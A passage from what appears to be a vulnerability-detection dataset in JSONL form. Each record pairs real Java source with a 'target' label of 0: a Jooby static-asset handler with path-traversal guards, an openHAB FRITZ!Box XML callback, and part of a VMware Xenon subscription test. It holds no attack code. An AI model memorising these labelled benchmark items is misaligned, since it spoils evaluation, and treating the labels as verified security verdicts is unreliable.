org.jooby.MediaType;\nimport org.jooby.Request;\nimport org.jooby.Response;\nimport org.jooby.Route;\nimport org.jooby.Status;\nimport org.jooby.funzy.Throwing;\nimport org.jooby.funzy.Try;\nimport org.jooby.internal.URLAsset;\n\nimport java.net.MalformedURLException;\nimport java.net.URL;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\nimport java.text.MessageFormat;\nimport java.time.Duration;\nimport java.util.Date;\nimport java.util.Map;\n\nimport static java.util.Objects.requireNonNull;\n\n/**\n * Serve static resources, via {@link Jooby#assets(String)} or variants.\n *\n * <h1>e-tag support</h1>\n * <p>\n * It generates <code>ETag</code> headers using {@link Asset#etag()}. It handles\n * <code>If-None-Match</code> header automatically.\n * </p>\n * <p>\n * <code>ETag</code> handling is enabled by default. If you want to disabled etag support\n * {@link #etag(boolean)}.\n * </p>\n *\n * <h1>modified since support</h1>\n * <p>\n * It generates <code>Last-Modified</code> header using {@link Asset#lastModified()}. It handles\n * <code>If-Modified-Since</code> header automatically.\n * </p>\n *\n * <h1>CDN support</h1>\n * <p>\n * Asset can be serve from a content delivery network (a.k.a cdn). All you have to do is to set the\n * <code>assets.cdn</code> property.\n * </p>\n *\n * <pre>\n * assets.cdn = \"http://d7471vfo50fqt.cloudfront.net\"\n * </pre>\n *\n * <p>\n * Resolved assets are redirected to the cdn.\n * </p>\n *\n * @author edgar\n * @since 0.1.0\n */\npublic class AssetHandler implements Route.Handler {\n\n  private interface Loader {\n    URL getResource(String name);\n  }\n\n  private static final Throwing.Function<String, String> prefix = prefix().memoized();\n\n  private Throwing.Function2<Request, String, String> fn;\n\n  private Loader loader;\n\n  private String cdn;\n\n  private boolean etag = true;\n\n  private long maxAge = -1;\n\n  private boolean lastModified = true;\n\n  private int statusCode = 404;\n\n  private String location;\n\n  private Path basedir;\n\n  private ClassLoader classLoader;\n\n  /**\n   * <p>\n   * Creates a new {@link AssetHandler}. The handler accepts a location pattern, that serve for\n   * locating the static resource.\n   * </p>\n   *\n   * Given <code>assets(\"/assets/**\", \"/\")</code> with:\n   *\n   * <pre>\n   *   GET /assets/js/index.js it translates the path to: /assets/js/index.js\n   * </pre>\n   *\n   * Given <code>assets(\"/js/**\", \"/assets\")</code> with:\n   *\n   * <pre>\n   *   GET /js/index.js it translate the path to: /assets/js/index.js\n   * </pre>\n   *\n   * Given <code>assets(\"/webjars/**\", \"/META-INF/resources/webjars/{0}\")</code> with:\n   *\n   * <pre>\n   *   GET /webjars/jquery/2.1.3/jquery.js it translate the path to: /META-INF/resources/webjars/jquery/2.1.3/jquery.js\n   * </pre>\n   *\n   * @param pattern Pattern to locate static resources.\n   * @param loader The one who load the static resources.\n   */\n  public AssetHandler(final String pattern, final ClassLoader loader) {\n    this.location = Route.normalize(pattern);\n    this.basedir = Paths.get(\"public\");\n    this.classLoader = loader;\n  }\n\n  /**\n   * <p>\n   * Creates a new {@link AssetHandler}. The handler accepts a location pattern, that serve for\n   * locating the static resource.\n   * </p>\n   *\n   * Given <code>assets(\"/assets/**\", \"/\")</code> with:\n   *\n   * <pre>\n   *   GET /assets/js/index.js it translates the path to: /assets/js/index.js\n   * </pre>\n   *\n   * Given <code>assets(\"/js/**\", \"/assets\")</code> with:\n   *\n   * <pre>\n   *   GET /js/index.js it translate the path to: /assets/js/index.js\n   * </pre>\n   *\n   * Given <code>assets(\"/webjars/**\", \"/META-INF/resources/webjars/{0}\")</code> with:\n   *\n   * <pre>\n   *   GET /webjars/jquery/2.1.3/jquery.js it translate the path to: /META-INF/resources/webjars/jquery/2.1.3/jquery.js\n   * </pre>\n   *\n   * @param basedir Base directory.\n   */\n  public AssetHandler(final Path basedir) {\n    this.location = \"/{0}\";\n    this.basedir = basedir;\n    this.classLoader = getClass().getClassLoader();\n  }\n\n  /**\n   * <p>\n   * Creates a new {@link AssetHandler}. The location pattern can be one of.\n   * </p>\n   *\n   * Given <code>/</code> like in <code>assets(\"/assets/**\", \"/\")</code> with:\n   *\n   * <pre>\n   *   GET /assets/js/index.js it translates the path to: /assets/js/index.js\n   * </pre>\n   *\n   * Given <code>/assets</code> like in <code>assets(\"/js/**\", \"/assets\")</code> with:\n   *\n   * <pre>\n   *   GET /js/index.js it translate the path to: /assets/js/index.js\n   * </pre>\n   *\n   * Given <code>/META-INF/resources/webjars/{0}</code> like in\n   * <code>assets(\"/webjars/**\", \"/META-INF/resources/webjars/{0}\")</code> with:\n   *\n   * <pre>\n   *   GET /webjars/jquery/2.1.3/jquery.js it translate the path to: /META-INF/resources/webjars/jquery/2.1.3/jquery.js\n   * </pre>\n   *\n   * @param pattern Pattern to locate static resources.\n   */\n  public AssetHandler(final String pattern) {\n    this.location = Route.normalize(pattern);\n    this.basedir = Paths.get(\"public\");\n    this.classLoader = getClass().getClassLoader();\n  }\n\n  /**\n   * @param etag Turn on/off etag support.\n   * @return This handler.\n   */\n  public AssetHandler etag(final boolean etag) {\n    this.etag = etag;\n    return this;\n  }\n\n  /**\n   * @param enabled Turn on/off last modified support.\n   * @return This handler.\n   */\n  public AssetHandler lastModified(final boolean enabled) {\n    this.lastModified = enabled;\n    return this;\n  }\n\n  /**\n   * @param cdn If set, every resolved asset will be serve from it.\n   * @return This handler.\n   */\n  public AssetHandler cdn(final String cdn) {\n    this.cdn = Strings.emptyToNull(cdn);\n    return this;\n  }\n\n  /**\n   * @param maxAge Set the cache header max-age value.\n   * @return This handler.\n   */\n  public AssetHandler maxAge(final Duration maxAge) {\n    return maxAge(maxAge.getSeconds());\n  }\n\n  /**\n   * @param maxAge Set the cache header max-age value in seconds.\n   * @return This handler.\n   */\n  public AssetHandler maxAge(final long maxAge) {\n    this.maxAge = maxAge;\n    return this;\n  }\n\n  /**\n   * Set the route definition and initialize the handler.\n   *\n   * @param route Route definition.\n   * @return This handler.\n   */\n  public AssetHandler setRoute(final Route.AssetDefinition route) {\n    String prefix;\n    boolean rootLocation = location.equals(\"/\") || location.equals(\"/{0}\");\n    if (rootLocation) {\n      String pattern = route.pattern();\n      int i = pattern.indexOf(\"/*\");\n      if (i > 0) {\n        prefix = pattern.substring(0, i + 1);\n      } else {\n        prefix = pattern;\n      }\n    } else {\n      int i = location.indexOf(\"{\");\n      if (i > 0) {\n        prefix = location.substring(0, i);\n      } else {\n        /// TODO: review what we have here\n        prefix = location;\n      }\n    }\n    if (prefix.startsWith(\"/\")) {\n      prefix = prefix.substring(1);\n    }\n    if (prefix.isEmpty() && rootLocation) {\n      throw new IllegalArgumentException(\n          \"For security reasons root classpath access is not allowed. Map your static resources \"\n              + \"using a prefix like: assets(static/**); or use a location classpath prefix like: \"\n              + \"assets(/, /static/{0})\");\n    }\n    init(prefix, location, basedir, classLoader);\n    return this;\n  }\n\n  /**\n   * Parse value as {@link Duration}. If the value is already a number then it uses as seconds.\n   * Otherwise, it parse expressions like: 8m, 1h, 365d, etc...\n   *\n   * @param maxAge Set the cache header max-age value in seconds.\n   * @return This handler.\n   */\n  public AssetHandler maxAge(final String maxAge) {\n    Try.apply(() -> Long.parseLong(maxAge))\n        .recover(x -> ConfigFactory.empty()\n            .withValue(\"v\", ConfigValueFactory.fromAnyRef(maxAge))\n            .getDuration(\"v\")\n            .getSeconds())\n        .onSuccess(this::maxAge);\n    return this;\n  }\n\n  /**\n   * Indicates what to do when an asset is missing (not resolved). Default action is to resolve them\n   * as <code>404 (NOT FOUND)</code> request.\n   *\n   * If you specify a status code &lt;= 0, missing assets are ignored and the next handler on pipeline\n   * will be executed.\n   *\n   * @param statusCode HTTP code or 0.\n   * @return This handler.\n   */\n  public AssetHandler onMissing(final int statusCode) {\n    this.statusCode = statusCode;\n    return this;\n  }\n\n  @Override\n  public void handle(final Request req, final Response rsp) throws Throwable {\n    String path = req.path();\n    URL resource = resolve(req, path);\n\n    if (resource != null) {\n      String localpath = resource.getPath();\n      int jarEntry = localpath.indexOf(\"!/\");\n      if (jarEntry > 0) {\n        localpath = localpath.substring(jarEntry + 2);\n      }\n\n      URLAsset asset = new URLAsset(resource, path,\n          MediaType.byPath(localpath).orElse(MediaType.octetstream));\n\n      if (asset.exists()) {\n        // cdn?\n        if (cdn != null) {\n          String absUrl = cdn + path;\n          rsp.redirect(absUrl);\n          rsp.end();\n        } else {\n          doHandle(req, rsp, asset);\n        }\n      }\n    } else if (statusCode > 0) {\n      throw new Err(statusCode);\n    }\n  }\n\n  private void doHandle(final Request req, final Response rsp, final Asset asset) throws Throwable {\n    // handle etag\n    if (this.etag) {\n      String etag = asset.etag();\n      boolean ifnm = req.header(\"If-None-Match\").toOptional()\n          .map(etag::equals)\n          .orElse(false);\n      if (ifnm) {\n        rsp.header(\"ETag\", etag).status(Status.NOT_MODIFIED).end();\n        return;\n      }\n\n      rsp.header(\"ETag\", etag);\n    }\n\n    // Handle if modified since\n    if (this.lastModified) {\n      long lastModified = asset.lastModified();\n      if (lastModified > 0) {\n        boolean ifm = req.header(\"If-Modified-Since\").toOptional(Long.class)\n            .map(ifModified -> lastModified / 1000 <= ifModified / 1000)\n            .orElse(false);\n        if (ifm) {\n          rsp.status(Status.NOT_MODIFIED).end();\n          return;\n        }\n        rsp.header(\"Last-Modified\", new Date(lastModified));\n      }\n    }\n\n    // cache max-age\n    if (maxAge > 0) {\n      rsp.header(\"Cache-Control\", \"max-age=\" + maxAge);\n    }\n\n    send(req, rsp, asset);\n  }\n\n  /**\n   * Send an asset to the client.\n   *\n   * @param req Request.\n   * @param rsp Response.\n   * @param asset Resolve asset.\n   * @throws Exception If send fails.\n   */\n  protected void send(final Request req, final Response rsp, final Asset asset) throws Throwable {\n    rsp.send(asset);\n  }\n\n  private URL resolve(final Request req, final String path) throws Throwable {\n    String target = fn.apply(req, path);\n    return resolve(target);\n  }\n\n  /**\n   * Resolve a path as a {@link URL}.\n   *\n   * @param path Path of resource to resolve.\n   * @return A URL or <code>null</code> for unresolved resource.\n   * @throws Exception If something goes wrong.\n   */\n  protected URL resolve(final String path) throws Exception {\n    return loader.getResource(path);\n  }\n\n  private void init(final String classPathPrefix, final String location, final Path basedir,\n      final ClassLoader loader) {\n    requireNonNull(loader, \"Resource loader is required.\");\n    this.fn = location.equals(\"/\")\n        ? (req, p) -> prefix.apply(p)\n        : (req, p) -> MessageFormat.format(prefix.apply(location), vars(req));\n    this.loader = loader(basedir, classpathLoader(classPathPrefix, classLoader));\n  }\n\n  private static Object[] vars(final Request req) {\n    Map<Object, String> vars = req.route().vars();\n    return vars.values().toArray(new Object[vars.size()]);\n  }\n\n  private static Loader loader(final Path basedir, Loader classpath) {\n    if (basedir != null && Files.exists(basedir)) {\n      return name -> {\n        Path path = basedir.resolve(name).normalize();\n        if (Files.exists(path) && path.startsWith(basedir)) {\n          try {\n            return path.toUri().toURL();\n          } catch (MalformedURLException x) {\n            // shh\n          }\n        }\n        return classpath.getResource(name);\n      };\n    }\n    return classpath;\n  }\n\n  private static Loader classpathLoader(String prefix, ClassLoader classloader) {\n    return name -> {\n      String safePath = safePath(name);\n      if (safePath.startsWith(prefix)) {\n        URL resource = classloader.getResource(safePath);\n        return resource;\n      }\n      return null;\n    };\n  }\n\n  private static String safePath(String name) {\n    if (name.indexOf(\"./\") > 0) {\n      Path path = toPath(name.split(\"/\")).normalize();\n      return toStringPath(path);\n    }\n    return name;\n  }\n\n  private static String toStringPath(Path path) {\n    StringBuilder buffer = new StringBuilder();\n    for (Path segment : path) {\n      buffer.append(\"/\").append(segment);\n    }\n    return buffer.substring(1);\n  }\n\n  private static Path toPath(String[] segments) {\n    Path path = Paths.get(segments[0]);\n    for (int i = 1; i < segments.length; i++) {\n      path = path.resolve(segments[i]);\n    }\n    return path;\n  }\n\n  private static Throwing.Function<String, String> prefix() {\n    return p -> p.substring(1);\n  }\n}\n", "target": 0}
{"idx": 1106, "func": "/**\n * Copyright (c) 2010-2020 Contributors to the openHAB project\n *\n * See the NOTICE file(s) distributed with this work for additional\n * information.\n *\n * This program and the accompanying materials are made available under the\n * terms of the Eclipse Public License 2.0 which is available at\n * http://www.eclipse.org/legal/epl-2.0\n *\n * SPDX-License-Identifier: EPL-2.0\n */\npackage org.openhab.binding.avmfritz.internal.hardware.callbacks;\n\nimport static org.eclipse.jetty.http.HttpMethod.GET;\n\nimport java.io.StringReader;\n\nimport javax.xml.bind.JAXBException;\nimport javax.xml.bind.Unmarshaller;\nimport javax.xml.stream.XMLStreamException;\nimport javax.xml.stream.XMLStreamReader;\n\nimport org.eclipse.jdt.annotation.NonNullByDefault;\nimport org.openhab.binding.avmfritz.internal.dto.templates.TemplateListModel;\nimport org.openhab.binding.avmfritz.internal.handler.AVMFritzBaseBridgeHandler;\nimport org.openhab.binding.avmfritz.internal.hardware.FritzAhaWebInterface;\nimport org.openhab.binding.avmfritz.internal.util.JAXBUtils;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\n/**\n * Callback implementation for updating templates from a xml response.\n *\n * @author Christoph Weitkamp - Initial contribution\n */\n@NonNullByDefault\npublic class FritzAhaUpdateTemplatesCallback extends FritzAhaReauthCallback {\n\n    private final Logger logger = LoggerFactory.getLogger(FritzAhaUpdateTemplatesCallback.class);\n\n    private static final String WEBSERVICE_COMMAND = \"switchcmd=gettemplatelistinfos\";\n\n    private final AVMFritzBaseBridgeHandler handler;\n\n    /**\n     * Constructor\n     *\n     * @param webInterface web interface to FRITZ!Box\n     * @param handler handler that will update things\n     */\n    public FritzAhaUpdateTemplatesCallback(FritzAhaWebInterface webInterface, AVMFritzBaseBridgeHandler handler) {\n        super(WEBSERVICE_PATH, WEBSERVICE_COMMAND, webInterface, GET, 1);\n        this.handler = handler;\n    }\n\n    @Override\n    public void execute(int status, String response) {\n        super.execute(status, response);\n        logger.trace(\"Received response '{}'\", response);\n        if (isValidRequest()) {\n            try {\n                XMLStreamReader xsr = JAXBUtils.XMLINPUTFACTORY.createXMLStreamReader(new StringReader(response));\n                Unmarshaller unmarshaller = JAXBUtils.JAXBCONTEXT_TEMPLATES.createUnmarshaller();\n                TemplateListModel model = (TemplateListModel) unmarshaller.unmarshal(xsr);\n                if (model != null) {\n                    handler.addTemplateList(model.getTemplates());\n                } else {\n                    logger.debug(\"no template in response\");\n                }\n            } catch (JAXBException | XMLStreamException e) {\n                logger.error(\"Exception creating Unmarshaller: {}\", e.getLocalizedMessage(), e);\n            }\n        } else {\n            logger.debug(\"request is invalid: {}\", status);\n        }\n    }\n}\n", "target": 0}
{"idx": 1107, "func": "/*\n * Copyright (c) 2014-2015 VMware, Inc. All Rights Reserved.\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\"); you may not\n * use this file except in compliance with the License.  You may obtain a copy of\n * the License at http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software distributed\n * under the License is distributed on an \"AS IS\" BASIS, without warranties or\n * conditions of any kind, EITHER EXPRESS OR IMPLIED.  See the License for the\n * specific language governing permissions and limitations under the License.\n */\n\npackage com.vmware.xenon.common;\n\nimport java.net.URI;\nimport java.util.ArrayList;\nimport java.util.Date;\nimport java.util.HashMap;\nimport java.util.List;\nimport java.util.Map;\nimport java.util.UUID;\nimport java.util.concurrent.ConcurrentSkipListMap;\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.TimeoutException;\nimport java.util.concurrent.atomic.AtomicBoolean;\nimport java.util.concurrent.atomic.AtomicInteger;\nimport java.util.function.Consumer;\nimport java.util.function.Function;\n\nimport org.junit.After;\nimport org.junit.Test;\n\nimport com.vmware.xenon.common.Service.Action;\nimport com.vmware.xenon.common.ServiceSubscriptionState.ServiceSubscriber;\nimport com.vmware.xenon.common.http.netty.NettyHttpServiceClient;\nimport com.vmware.xenon.common.test.MinimalTestServiceState;\nimport com.vmware.xenon.common.test.TestContext;\nimport com.vmware.xenon.common.test.VerificationHost;\nimport com.vmware.xenon.services.common.ExampleService;\nimport com.vmware.xenon.services.common.ExampleService.ExampleServiceState;\nimport com.vmware.xenon.services.common.MinimalTestService;\nimport com.vmware.xenon.services.common.NodeGroupService.NodeGroupConfig;\nimport com.vmware.xenon.services.common.ServiceUriPaths;\n\n\npublic class TestSubscriptions extends BasicTestCase {\n    private final int NODE_COUNT = 2;\n\n    public int serviceCount = 100;\n    public long updateCount = 10;\n    public long iterationCount = 0;\n\n    @Override\n    public void beforeHostStart(VerificationHost host) {\n        host.setMaintenanceIntervalMicros(TimeUnit.MILLISECONDS\n                .toMicros(VerificationHost.FAST_MAINT_INTERVAL_MILLIS));\n    }\n\n    @After\n    public void tearDown() {\n        this.host.tearDown();\n        this.host.tearDownInProcessPeers();\n    }\n\n    private void setUpPeers() throws Throwable {\n        this.host.setUpPeerHosts(this.NODE_COUNT);\n        this.host.joinNodesAndVerifyConvergence(this.NODE_COUNT);\n    }\n\n    @Test\n    public void remoteAndReliableSubscriptionsLoop() throws Throwable {\n        for (int i = 0; i < this.iterationCount; i++) {\n            tearDown();\n            this.host = createHost();\n            initializeHost(this.host);\n            beforeHostStart(this.host);\n            this.host.start();\n            remoteAndReliableSubscriptions();\n        }\n    }\n\n    @Test\n    public void remoteAndReliableSubscriptions() throws Throwable {\n        setUpPeers();\n\n        // pick one host to post to\n        VerificationHost serviceHost = this.host.getPeerHost();\n        URI factoryUri = UriUtils.buildUri(serviceHost, ExampleService.FACTORY_LINK);\n        this.host.waitForReplicatedFactoryServiceAvailable(factoryUri);\n\n        // test host to receive notifications\n        VerificationHost localHost = this.host;\n        int serviceCount = 1;\n        List<URI> exampleURIs = new ArrayList<>();\n        // create example service documents across all nodes\n        serviceHost.createExampleServices(serviceHost, serviceCount, exampleURIs, null);\n        TestContext oneUseNotificationCtx = this.host.testCreate(1);\n        StatelessService notificationTarget = new StatelessService() {\n            @Override\n            public void handleRequest(Operation update) {\n                update.complete();\n                if (update.getAction().equals(Action.PATCH)) {\n                    if (update.getUri().getHost() == null) {\n                        oneUseNotificationCtx.fail(new IllegalStateException(\n                                \"Notification URI does not have host specified\"));\n                        return;\n                    }\n                    oneUseNotificationCtx.complete();\n                }\n            }\n        };\n\n        String[] ownerHostId = new String[1];\n        URI uri = exampleURIs.get(0);\n        URI subUri = UriUtils.buildUri(serviceHost.getUri(), uri.getPath());\n        TestContext subscribeCtx = this.host.testCreate(1);\n        Operation subscribe = Operation.createPost(subUri)\n                .setCompletion(subscribeCtx.getCompletion());\n        subscribe.setReferer(localHost.getReferer());\n        subscribe.forceRemote();\n        // replay state\n        serviceHost.startSubscriptionService(subscribe, notificationTarget, ServiceSubscriber\n                .create(false).setUsePublicUri(true));\n        this.host.testWait(subscribeCtx);\n\n        // do an update to cause a notification\n        TestContext updateCtx = this.host.testCreate(1);\n        ExampleServiceState body = new ExampleServiceState();\n        body.name = UUID.randomUUID().toString();\n        this.host.send(Operation.createPatch(uri).setBody(body).setCompletion((o, e) -> {\n            if (e != null) {\n                updateCtx.fail(e);\n                return;\n            }\n            ExampleServiceState rsp = o.getBody(ExampleServiceState.class);\n            ownerHostId[0] = rsp.documentOwner;\n            updateCtx.complete();\n\n        }));\n        this.host.testWait(updateCtx);\n        this.host.testWait(oneUseNotificationCtx);\n\n        // remove subscription\n        TestContext unSubscribeCtx = this.host.testCreate(1);\n        Operation unSubscribe = subscribe.clone()\n                .setCompletion(unSubscribeCtx.getCompletion())\n                .setAction(Action.DELETE);\n        serviceHost.stopSubscriptionService(unSubscribe,\n                notificationTarget.getUri());\n        this.host.testWait(unSubscribeCtx);\n        this.verifySubscriberCount(new URI[] { uri }, 0);\n\n        VerificationHost ownerHost = null;\n        // find the host that owns the example service and make sure we subscribe from the OTHER\n        // host (since we will stop the current owner)\n        for (VerificationHost h : this.host.getInProcessHostMap().values()) {\n            if (!h.getId().equals(ownerHostId[0])) {\n                serviceHost = h;\n            } else {\n                ownerHost = h;\n            }\n        }\n\n        this.host.log(\"Owner node: %s, subscriber node: %s (%s)\", ownerHostId[0],\n                serviceHost.getId(), serviceHost.getUri());\n\n        AtomicInteger reliableNotificationCount = new AtomicInteger();\n        TestContext subscribeCtxNonOwner = this.host.testCreate(1);\n        // subscribe using non owner host\n        subscribe.setCompletion(subscribeCtxNonOwner.getCompletion());\n        serviceHost.startReliableSubscriptionService(subscribe, (o) -> {\n            reliableNotificationCount.incrementAndGet();\n            o.complete();\n        });\n        localHost.testWait(subscribeCtxNonOwner);\n\n        // send explicit update to example service\n        body.name = UUID.randomUUID().toString();\n        this.host.send(Operation.createPatch(uri).setBody(body));\n\n        while (reliableNotificationCount.get() < 1) {\n            Thread.sleep(100);\n        }\n\n        reliableNotificationCount.set(0);\n\n        this.verifySubscriberCount(new URI[] { uri }, 1);\n\n        // Check reliability: determine what host is owner for the example service we subscribed to.\n        // Then stop that host which should cause the remaining host(s) to pick up ownership.\n        // Subscriptions will not survive on their own, but we expect the ReliableSubscriptionService\n        // to notice the subscription is gone on the new owner, and re subscribe.\n        List<URI> exampleSubUris = new ArrayList<>();\n        for (URI hostUri : this.host.getNodeGroupMap().keySet()) {\n            exampleSubUris.add(UriUtils.buildUri(hostUri, uri.getPath(),\n                    ServiceHost.SERVICE_URI_SUFFIX_SUBSCRIPTIONS));\n        }\n\n        // stop host that has ownership of example service\n        NodeGroupConfig cfg = new NodeGroupConfig();\n        cfg.nodeRemovalDelayMicros = TimeUnit.SECONDS.toMicros(2);\n        this.host.setNodeGroupConfig(cfg);\n\n        // relax quorum\n        this.host.setNodeGroupQuorum(1);\n        // stop host with subscription\n        this.host.stopHost(ownerHost);\n\n        factoryUri = UriUtils.buildUri(serviceHost, ExampleService.FACTORY_LINK);\n        this.host.waitForReplicatedFactoryServiceAvailable(factoryUri);\n\n        uri = UriUtils.buildUri(serviceHost.getUri(), uri.getPath());\n\n        // verify that we still have 1 subscription on the remaining host, which can only happen if the\n        // reliable subscription service notices the current owner failure and re subscribed\n        this.verifySubscriberCount(new URI[] { uri }, 1);\n\n        // and test once again that notifications flow.\n        this.host.log(\"Sending PATCH requests to %s\", uri);\n        long c = this.updateCount;\n        for (int i = 0; i < c; i++) {\n            body.name = \"post-stop-\" + UUID.randomUUID().toString();\n            this.host.send(Operation.createPatch(uri).setBody(body));\n        }\n\n        Date exp = this.host.getTestExpiration();\n        while (reliableNotificationCount.get() < c) {\n            Thread.sleep(250);\n            this.host.log(\"Received %d notifications, expecting %d\",\n                    reliableNotificationCount.get(), c);\n            if (new Date().after(exp)) {\n                throw new TimeoutException();\n            }\n        }\n    }\n\n    @Test\n    public void subscriptionsToFactoryAndChildren() throws Throwable {\n        this.host.stop();\n        this.host.setPort(0);\n        this.host.start();\n        this.host.setPublicUri(UriUtils.buildUri(\"localhost\", this.host.getPort(), \"\", null));\n        this.host.waitForServiceAvailable(ExampleService.FACTORY_LINK);\n\n        URI factoryUri = UriUtils.buildFactoryUri(this.host, ExampleService.class);\n\n        String prefix = \"example-\";\n        Long counterValue = Long.MAX_VALUE;\n        URI[] childUris = new URI[this.serviceCount];\n\n        doFactoryPostNotifications(factoryUri, this.serviceCount, prefix, counterValue, childUris);\n\n        doNotificationsWithReplayState(childUris);\n\n        doNotificationsWithFailure(childUris);\n\n        doNotificationsWithLimitAndPublicUri(childUris);\n\n        doNotificationsWithExpiration(childUris);\n\n        doDeleteNotifications(childUris, counterValue);\n    }\n\n    @Test\n    public void subscriptionsWithAuth() throws Throwable {\n        VerificationHost hostWithAuth = null;\n        try {\n            String testUserEmail = \"foo@vmware.com\";\n            hostWithAuth = VerificationHost.create(0);\n            hostWithAuth.setAuthorizationEnabled(true);\n            hostWithAuth.start();\n            hostWithAuth.setSystemAuthorizationContext();\n            TestContext waitContext = hostWithAuth.testCreate(1);\n            AuthorizationSetupHelper.create()\n                    .setHost(hostWithAuth)\n                    .setDocumentKind(Utils.buildKind(MinimalTestServiceState.class))\n                    .setUserEmail(testUserEmail)\n                    .setUserSelfLink(testUserEmail)\n                    .setUserPassword(testUserEmail)\n                    .setCompletion(waitContext.getCompletion())\n                    .start();\n            hostWithAuth.testWait(waitContext);\n            hostWithAuth.resetSystemAuthorizationContext();\n            hostWithAuth.assumeIdentity(UriUtils.buildUriPath(ServiceUriPaths.CORE_AUTHZ_USERS, testUserEmail));\n            MinimalTestService s = new MinimalTestService();\n            MinimalTestServiceState serviceState = new MinimalTestServiceState();\n            serviceState.id = UUID.randomUUID().toString();\n            String minimalServiceUUID = UUID.randomUUID().toString();\n            TestContext notifyContext = hostWithAuth.testCreate(1);\n            hostWithAuth.startServiceAndWait(s, minimalServiceUUID, serviceState);\n\n            Consumer<Operation> notifyC = (nOp) -> {\n                nOp.complete();\n                switch (nOp.getAction()) {\n                case PUT:\n                    notifyContext.completeIteration();\n                    break;\n                default:\n                    break;\n\n                }\n            };\n\n            hostWithAuth.setSystemAuthorizationContext();\n            Operation subscribe = Operation.createPost(UriUtils.buildUri(hostWithAuth, minimalServiceUUID));\n            subscribe.setReferer(hostWithAuth.getReferer());\n            ServiceSubscriber subscriber = new ServiceSubscriber();\n            subscriber.replayState = true;\n            hostWithAuth.startSubscriptionService(subscribe, notifyC, subscriber);\n            hostWithAuth.resetAuthorizationContext();\n            hostWithAuth.testWait(notifyContext);\n        } finally {\n            if (hostWithAuth != null) {\n                hostWithAuth.tearDown();\n            }\n        }\n    }\n\n    @Test\n    public void subscribeAndWaitForServiceAvailability() throws Throwable {\n        // until HTTP2 support is we must only subscribe to less than max connections!\n        // otherwise we deadlock: the connection for the queued subscribe is used up,\n        // no more connections can be created, to that owner.\n        this.serviceCount = NettyHttpServiceClient.DEFAULT_CONNECTIONS_PER_HOST / 2;\n        // set the connection limit higher for the test host since it will be issuing parallel\n        // subscribes, POSTs\n        this.host.getClient().setConnectionLimitPerHost(this.serviceCount * 4);\n        setUpPeers();\n\n        for (VerificationHost h : this.host.getInProcessHostMap().values()) {\n            h.getClient().setConnectionLimitPerHost(this.serviceCount * 4);\n        }\n\n        this.host.waitForReplicatedFactoryServiceAvailable(\n                this.host.getPeerServiceUri(ExampleService.FACTORY_LINK));\n\n        // Pick one host to post to\n        VerificationHost serviceHost = this.host.getPeerHost();\n\n        // Create example service states to subscribe to\n        List<ExampleServiceState> states = new ArrayList<>();\n        for (int i = 0; i < this.serviceCount; i++) {\n            ExampleServiceState state = new ExampleServiceState();\n            state.documentSelfLink = UriUtils.buildUriPath(\n                    ExampleService.FACTORY_LINK,\n                    UUID.randomUUID().toString());\n            state.name = UUID.randomUUID().toString();\n            states.add(state);\n        }\n\n        AtomicInteger notifications = new AtomicInteger();\n        // Subscription target\n        ServiceSubscriber sr = createAndStartNotificationTarget((update) -> {\n            if (update.getAction() != Action.PATCH) {\n                // because we start multiple nodes and we do not wait for factory start\n                // we will receive synchronization related PUT requests, on each service.\n                // Ignore everything but the PATCH we send from the test\n                return false;\n            }\n            this.host.completeIteration();\n            this.host.log(\"notification %d\", notifications.incrementAndGet());\n            update.complete();\n            return true;\n        });\n\n        this.host.log(\"Subscribing to %d services\", this.serviceCount);\n        // Subscribe to factory (will not complete until factory is started again)\n        for (ExampleServiceState state : states) {\n            URI uri = UriUtils.buildUri(serviceHost, state.documentSelfLink);\n            subscribeToService(uri, sr);\n        }\n\n        // First the subscription requests will be sent and will be queued.\n        // So N completions come from the subscribe requests.\n        // After that, the services will be POSTed and started. This is the second set\n        // of N completions.\n        this.host.testStart(2 * this.serviceCount);\n        this.host.log(\"Sending parallel POST for %d services\", this.serviceCount);\n\n        AtomicInteger postCount = new AtomicInteger();\n        // Create example services, triggering subscriptions to complete\n        for (ExampleServiceState state : states) {\n            URI uri = UriUtils.buildFactoryUri(serviceHost, ExampleService.class);\n            Operation op = Operation.createPost(uri)\n                    .setBody(state)\n                    .setCompletion((o, e) -> {\n                        if (e != null) {\n                            this.host.failIteration(e);\n                            return;\n                        }\n                        this.host.log(\"POST count %d\", postCount.incrementAndGet());\n                        this.host.completeIteration();\n                    });\n            this.host.send(op);\n        }\n\n        this.host.testWait();\n\n        this.host.testStart(2 * this.serviceCount);\n        // now send N PATCH ops so we get notifications\n        for (ExampleServiceState state : states) {\n            // send a PATCH, to trigger notification\n            URI u = UriUtils.buildUri(serviceHost, state.documentSelfLink);\n            state.counter = Utils.getNowMicrosUtc();\n            Operation patch = Operation.createPatch(u)\n                    .setBody(state)\n                    .setCompletion(this.host.getCompletion());\n            this.host.send(patch);\n        }\n        this.host.testWait();\n    }\n\n    private void doFactoryPostNotifications(URI factoryUri, int childCount, String prefix,\n            Long counterValue,\n            URI[] childUris) throws Throwable {\n        this.host.log(\"starting subscription to factory\");\n        this.host.testStart(1);\n        // let the service host update the URI from the factory to its subscriptions\n        Operation subscribeOp = Operation.createPost(factoryUri)\n                .setReferer(this.host.getReferer())\n                .setCompletion(this.host.getCompletion());\n        URI notificationTarget = host.startSubscriptionService(subscribeOp, (o) -> {\n            if (o.getAction() == Action.POST) {\n                this.host.completeIteration();\n            } else {\n                this.host.failIteration(new IllegalStateException(\"Unexpected notification: \"\n                        + o.toString()));\n            }\n        });\n        this.host.testWait();\n\n        // expect a POST notification per child, a POST completion per child\n        this.host.testStart(childCount * 2);\n        for (int i = 0; i < childCount; i++) {\n            ExampleServiceState initialState = new ExampleServiceState();\n            initialState.name = initialState.documentSelfLink = prefix + i;\n            initialState.counter = counterValue;\n            final int finalI = i;\n\n            // create an example service\n            this.host.send(Operation\n                    .createPost(factoryUri)\n                    .setBody(initialState).setCompletion((o, e) -> {\n                        if (e != null) {\n                            this.host.failIteration(e);\n                            return;\n                        }\n                        ServiceDocument rsp = o.getBody(ServiceDocument.class);\n                        childUris[finalI] = UriUtils.buildUri(this.host, rsp.documentSelfLink);\n                        this.host.completeIteration();\n                    }));\n        }\n        this.host.testWait();\n\n        this.host.testStart(1);\n        Operation delete = 